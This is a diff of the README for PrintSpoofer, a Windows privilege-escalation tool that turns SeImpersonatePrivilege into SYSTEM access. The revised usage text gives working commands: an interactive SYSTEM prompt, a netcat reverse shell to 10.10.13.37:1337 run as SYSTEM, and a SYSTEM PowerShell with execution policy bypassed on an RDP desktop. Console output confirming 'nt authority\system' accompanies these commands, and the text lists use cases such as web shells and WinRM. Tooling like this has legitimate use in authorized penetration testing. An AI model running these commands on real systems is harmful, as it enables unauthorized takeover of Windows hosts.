@@ -2,7 +2,7 @@
 
 From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.
 
-:information_source: If you want to know how this works, please check out this detailed blog post: [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).
+For more information: [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).
 
 <p align="center">
   <img src="demo.gif">
@@ -21,25 +21,25 @@ PrintSpoofer v0.1 (by @itm4n)
   Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()
 
 Arguments:
-  -c <CMD>    Custom command line to execute
-  -i          Interact with the new process in the current console (default is non-interactive)
-  -d          Spawn a new process on the currently active desktop
+  -c <CMD>    Execute the command *CMD*
+  -i          Interact with the new process in the current command prompt (default is non-interactive)
+  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
   -h          That's me :)
 
 Examples:
   - Run PowerShell as SYSTEM in the current console
       PrintSpoofer.exe -i -c powershell.exe
-  - Spawn a SYSTEM command prompt on the currently active desktop
-      PrintSpoofer.exe -d -c cmd.exe
+  - Spawn a SYSTEM command prompt on the desktop of the session 1
+      PrintSpoofer.exe -d 1 -c cmd.exe
   - Get a SYSTEM reverse shell
       PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
 ```
 
-### Example 1: Spawn a SYSTEM command prompt in the current console
+### Usage 1: Spawn a SYSTEM process and interact with it
 
-:information_source: This command requires an __interactive__ shell.
+If you have an __interactive__ shell, you can create a new SYSTEM process in your current console.
 
-:warning: Don't run this command through WinRM or in a pseudo-shell (e.g.: `wmiexec.py`).
+__Use case__: bind shell, reverse shell, `psexec.py`, etc.
 
 ```txt
 C:\TOOLS>PrintSpoofer.exe -i -c cmd
@@ -53,9 +53,13 @@ C:\WINDOWS\system32>whoami
 nt authority\system
 ```
 
-### Example 2: Get a SYSTEM reverse shell
+### Usage 2: Spawn a SYSTEM process and exit
 
-:information_source: This command can be used to create a new process and immediately exit.
+If you can __execute commands__ but you don't have an interactive shell, you can create a new SYSTEM process and exit immediately without interacting with it.
+
+__Use case__: WinRM, WebShell, `wmiexec.py`, `smbexec.py`, etc.
+
+Create a reverse shell:
 
 ```txt
 C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
@@ -75,14 +79,21 @@ C:\WINDOWS\system32>whoami
 nt authority\system
 ```
 
-### Example 3: Spawn a SYSTEM PowerShell prompt on the active desktop
+### Usage 3: Spawn a SYSTEM process on a desktop
 
-:information_source: For testing purposes, you can spawn a SYSTEM shell on your desktop. :)
+If you are __logged on locally or via RDP__ (including VDI), you can spawn a SYSTEM command prompt on your desktop. First, check your session ID with the command `qwinsta` and then specify this value with the option `-d`.
 
-:warning: Don't run this command in a terminal session (RDP).
+__Use case__: Terminal Session (RDP), VDI
 
 ```txt
-C:\TOOLS>PrintSpoofer.exe -d -c "powershell -ep bypass"
+C:\TOOLS>qwinsta
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+ services                                    0  Disc
+ console           Administrator             1  Active
+>rdp-tcp#3         lab-user                  3  Active
+ rdp-tcp                                 65536  Listen
+
+C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
